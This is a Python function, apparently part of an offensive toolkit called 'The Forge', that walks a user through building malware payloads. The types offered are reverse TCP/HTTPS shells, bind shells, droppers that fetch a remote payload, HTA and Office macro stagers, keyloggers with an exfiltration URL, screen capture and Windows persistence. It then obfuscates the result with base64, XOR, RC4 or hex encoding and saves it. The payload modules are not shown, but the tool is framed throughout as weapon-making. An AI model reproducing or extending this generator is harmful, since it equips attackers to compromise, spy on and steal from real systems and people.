def interactive_generate():
    """Interactive payload generation wizard."""
    print("""
    ╔══════════════════════════════════════════════╗
    ║     THE FORGE — PAYLOAD GENERATOR            ║
    ║     "From raw metal to lethal weapon."        ║
    ╚══════════════════════════════════════════════╝
    """)

    # Step 1: Select payload type
    print("[1] Select Payload Type:")
    types = list(PAYLOAD_REGISTRY.keys())
    if not types:
        print("[!] No payload modules loaded. Check your installation.")
        return
    for i, t in enumerate(types, 1):
        print(f"    {i}. {t}")

    try:
        choice = int(input("\n    → Choice: ")) - 1
        if choice < 0 or choice >= len(types):
            print("[!] Invalid choice.")
            return
    except (ValueError, EOFError):
        print("[!] Invalid input.")
        return

    payload_type = types[choice]
    module = PAYLOAD_REGISTRY[payload_type]

    # Step 2: Select variant
    print(f"\n[2] Select Variant for [{payload_type}]:")
    variants = module.list_variants()
    for i, v in enumerate(variants, 1):
        print(f"    {i}. {v}")

    try:
        vchoice = int(input("\n    → Choice: ")) - 1
        variant = variants[vchoice]
    except (ValueError, IndexError, EOFError):
        print("[!] Invalid choice.")
        return

    # Step 3: Collect parameters
    print(f"\n[3] Parameters for [{payload_type}/{variant}]:")
    params = {}

    # Common params based on type
    if payload_type in ("reverse_tcp", "reverse_https"):
        params["host"] = input("    LHOST: ").strip() or "127.0.0.1"
        params["port"] = int(input("    LPORT: ").strip() or "4444")
    elif payload_type == "bind_shell":
        params["port"] = int(input("    PORT: ").strip() or "4444")
        pwd = input("    PASSWORD [forge]: ").strip()
        if pwd:
            params["password"] = pwd
    elif payload_type == "dropper":
        params["url"] = input("    PAYLOAD URL: ").strip() or "http://127.0.0.1/payload"
    elif payload_type == "hta_stager":
        params["command"] = input("    COMMAND: ").strip() or "calc.exe"
    elif payload_type == "macro_stager":
        params["command"] = input("    COMMAND: ").strip() or "calc.exe"
    elif payload_type == "keylogger":
        params["exfil_url"] = input("    EXFIL URL [none]: ").strip() or None
    elif payload_type == "screencap":
        params["interval"] = int(input("    INTERVAL (sec) [30]: ").strip() or "30")
    elif payload_type == "persistence":
        params["payload_path"] = input("    PAYLOAD PATH: ").strip() or "C:\\Windows\\Temp\\svc.exe"

    # Step 4: Generate
    print(f"\n[4] Generating {payload_type}/{variant}...")
    try:
        payload = module.generate(**params, language=variant) if "language" in str(module.generate.__code__.co_varnames) else module.generate(**params)
    except TypeError:
        # Some generators use positional args
        if "host" in params and "port" in params:
            payload = module.generate(params["host"], params["port"], language=variant)
        elif "port" in params:
            payload = module.generate(params["port"], language=variant)
        else:
            payload = module.generate(**params)

    # Step 5: Encoding
    print("\n[5] Select Encoding:")
    encodings = ["none", "base64", "xor", "rc4", "hex", "chr", "double_b64"]
    for i, e in enumerate(encodings, 1):
        print(f"    {i}. {e}")

    try:
        echoice = int(input("\n    → Choice: ")) - 1
        encoding = encodings[echoice]
    except (ValueError, IndexError, EOFError):
        encoding = "none"

    if encoding != "none":
        payload = apply_encoding(payload, encoding)
        print(f"    [+] Applied {encoding} encoding.")

    # Step 6: Output
    print("\n[6] Output:")
    print("    1. Print to screen")
    print("    2. Save to file")
    print("    3. Both")

    try:
        ochoice = int(input("\n    → Choice: ") or "1")
    except (ValueError, EOFError):
        ochoice = 1

    metadata = {
        "type": payload_type,
        "variant": variant,
        "encoding": encoding,
        "params": json.dumps({k: v for k, v in params.items() if v is not None}),
    }

    if ochoice in (1, 3):
        print("\n" + "=" * 60)
        print(payload)
        print("=" * 60)

    if ochoice in (2, 3):
        default_name = f"forge_{payload_type}_{variant}.txt"
        output = input(f"    Filename [{default_name}]: ").strip() or default_name
        save_payload(payload, output, metadata)

    print("\n[+] Done. Weapon forged. 🔥")


